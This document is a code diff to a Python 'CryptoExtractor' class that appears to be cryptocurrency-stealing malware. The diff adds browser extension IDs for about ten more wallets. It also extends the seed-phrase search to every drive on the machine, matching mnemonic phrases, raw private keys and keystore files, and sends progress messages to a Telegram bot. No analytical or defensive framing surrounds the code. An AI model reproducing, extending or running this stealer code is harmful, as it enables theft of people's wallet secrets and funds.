@@ -136,9 +136,10 @@ class CryptoExtractor:
         return None
     
     def extract_all_crypto_extensions(self, browser_path, browser_name):
-        """Extract all crypto wallet extensions"""
+        """Extract all crypto wallet extensions - COMPLETE LIST"""
         all_wallets = []
         
+        # COMPLETE LIST OF ALL CRYPTO WALLETS
         crypto_extensions = {
             'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
             'phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
@@ -149,6 +150,16 @@ class CryptoExtractor:
             'mathwallet': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
             'tronlink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
             'binance': 'fhbohimaelbohpjbbldcngcnapndodjp',
+            'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
+            'keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
+            'solflare': 'bhghoamapcdpbohphigoooaddinpkbai',
+            'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
+            'frame': 'hbljlbphjnlghnjjajibkfnmlfcglflj',
+            'temple': 'ookjlbkiijinhpmnjffcofjonbfbgaoc',
+            'yoroi': 'ffnbelfdoehohenjggjdkclllmacjbdi',
+            'nami': 'glnpiemhiohmelhjhijhbidkolnmdlkd',
+            'gero': 'ghgabhidcehdhjifalgafbgkhloaklkd',
+            'flint': 'nfhnjljdfibcnahpjljadgcmaljpljnm',
         }
         
         ext_base = os.path.join(browser_path, 'Default', 'Extensions')
@@ -273,7 +284,15 @@ class CryptoExtractor:
         self._log("Searching for seed phrases...")
         seeds = []
         
-        search_paths = [
+        # Get all drives for FULL PC SCAN
+        drives = []
+        try:
+            result = subprocess.run(['wmic', 'logicaldisk', 'get', 'name'], capture_output=True, text=True)
+            drives = [line.strip() + '\\' for line in result.stdout.split('\n') if line.strip() and ':' in line]
+        except:
+            drives = ['C:\\']
+        
+        user_paths = [
             os.environ.get('APPDATA', ''),
             os.environ.get('LOCALAPPDATA', ''),
             os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
@@ -281,43 +300,75 @@ class CryptoExtractor:
             os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
         ]
         
+        search_paths = drives + user_paths
+        
         wallet_dirs = [
             'MetaMask', 'Trust Wallet', 'Exodus', 'Atomic Wallet', 'Electrum',
             'MyEtherWallet', 'Phantom', 'Solflare', 'Coinbase', 'Binance',
+            'Ledger', 'Trezor', 'KeepKey', 'Jaxx', 'Jaxx Liberty',
         ]
         
-        seed_patterns = ['seed', 'mnemonic', 'wallet', 'backup', 'recovery', 'private', 'key', 'phrase']
+        seed_patterns = ['seed', 'mnemonic', 'wallet', 'backup', 'recovery', 'private', 'key', 'phrase', 'keystore', 'passphrase']
+        crypto_extensions = ['.txt', '.json', '.dat', '.key', '.wallet', '.keystore', '.db', '.sqlite', '.ldb']
+        
+        self.telegram.send_message("🔍 <b>Scanning entire PC for crypto data...</b>")
         
         for base_path in search_paths:
             if not os.path.exists(base_path):
                 continue
             
-            for wallet_dir in wallet_dirs:
-                wallet_path = os.path.join(base_path, wallet_dir)
-                if os.path.exists(wallet_path):
-                    for root, dirs, files in os.walk(wallet_path):
-                        for file in files:
-                            file_lower = file.lower()
-                            if any(p in file_lower for p in seed_patterns) or file.endswith(('.txt', '.json', '.dat', '.key')):
-                                try:
-                                    file_path = os.path.join(root, file)
-                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                        content = f.read()
-                                        words = content.split()
-                                        if 12 <= len(words) <= 24:
+            is_drive_root = len(base_path) == 3 and base_path.endswith(':\\')
+            
+            try:
+                for root, dirs, files in os.walk(base_path):
+                    if not is_drive_root:
+                        dirs[:] = [d for d in dirs if d not in ['$Recycle.Bin', 'System Volume Information', 'Windows', 'Program Files', 'Program Files (x86)']]
+                    
+                    if is_drive_root:
+                        depth = root[len(base_path):].count(os.sep) if base_path else 0
+                        if depth > 3:
+                            dirs[:] = []
+                            continue
+                    
+                    for file in files:
+                        file_lower = file.lower()
+                        file_path = os.path.join(root, file)
+                        
+                        if any(p in file_lower for p in seed_patterns) or any(file.endswith(ext) for ext in crypto_extensions):
+                            try:
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read(50000)
+                                    words = content.split()
+                                    
+                                    if 12 <= len(words) <= 24:
+                                        common = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse']
+                                        if any(w.lower() in common for w in words[:10]):
                                             seeds.append({
                                                 "file": file_path,
-                                                "content": content,
+                                                "content": content[:5000],
                                                 "word_count": len(words),
                                                 "type": "seed_phrase"
                                             })
-                                        elif len(content) == 64 or (content.startswith('0x') and len(content) == 66):
-                                            seeds.append({
-                                                "file": file_path,
-                                                "content": content,
-                                                "type": "private_key"
-                                            })
-                                except: continue
+                                    
+                                    elif len(content.strip()) == 64 or (content.strip().startswith('0x') and len(content.strip()) == 66):
+                                        seeds.append({
+                                            "file": file_path,
+                                            "content": content.strip(),
+                                            "type": "private_key"
+                                        })
+                                    
+                                    elif content.strip().startswith('{') and ('crypto' in content.lower() or 'keystore' in content.lower()):
+                                        try:
+                                            json_data = json.loads(content)
+                                            if 'crypto' in json_data or 'keystore' in json_data:
+                                                seeds.append({
+                                                    "file": file_path,
+                                                    "content": content[:5000],
+                                                    "type": "keystore"
+                                                })
+                                        except: pass
+                            except: continue
+            except: continue
         
         return seeds
     
